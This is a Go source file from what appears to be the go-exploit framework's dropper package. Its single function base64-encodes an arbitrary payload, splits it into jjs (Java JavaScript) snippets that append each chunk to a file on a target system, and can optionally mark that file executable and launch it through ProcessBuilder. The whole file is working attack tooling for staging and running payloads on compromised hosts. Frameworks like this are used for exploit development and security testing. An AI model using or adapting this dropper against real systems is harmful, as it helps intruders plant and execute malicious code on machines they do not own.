package dropper

import (
	"encoding/base64"
	"fmt"
	"slices"

	"github.com/vulncheck-oss/go-exploit/output"
)

// Generates a script that can be used to create a file on disk via jjs (Java javascript). And if
// execute is true, then toggle file permissions and execute the payload. The number of chunks are
// in bytes.
func (jjs *JJSScriptPayload) WriteChunks(content []byte, targetFile string, chunkSize int, execute bool) []string {
	if chunkSize <= 0 {
		output.PrintfFrameworkError("Chunk size cannot be <= 0 as that is not meaningful")

		return []string{}
	}
	var chunks [][]byte
	var jjsChunks []string
	dst := make([]byte, base64.StdEncoding.EncodedLen(len(content)))
	base64.StdEncoding.Encode(dst, content)
	for split := range slices.Chunk(dst, chunkSize) {
		chunks = append(chunks, split)
	}

	script := `var d=java.util.Base64.getDecoder().decode("%s");
var f=new java.io.File("%s");
var bw=new java.io.FileOutputStream(f, true);
bw.write(d); 
bw.close();`
	execScript := `f.setExecutable(true, true);
var p=new java.lang.ProcessBuilder("%s").start();`
	for i, chunk := range chunks {
		if i+1 == len(chunks) {
			if execute {
				jjsChunks = append(jjsChunks, fmt.Sprintf(script, string(chunk), targetFile)+"\n"+fmt.Sprintf(execScript, targetFile))
			} else {
				jjsChunks = append(jjsChunks, fmt.Sprintf(script, string(chunk), targetFile))
			}
		} else {
			jjsChunks = append(jjsChunks, fmt.Sprintf(script, string(chunk), targetFile))
		}
	}

	return jjsChunks
}
